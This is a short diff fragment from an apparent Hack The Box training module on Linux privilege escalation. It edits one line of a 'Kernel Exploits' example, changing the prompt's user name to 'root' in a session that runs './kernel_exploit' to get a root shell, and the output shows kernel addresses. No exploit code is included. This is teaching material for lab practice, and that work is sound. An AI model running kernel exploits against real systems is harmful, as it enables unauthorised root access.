@@ -3302,7 +3302,7 @@ Next, we run the exploit and hopefully get dropped into a root shell.
 &#x20; Kernel Exploits
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./kernel_exploit 
+root@htb[/htb]$ ./kernel_exploit 
 
 task_struct = ffff8800b71d7000
 uidptr = ffff8800b95ce544
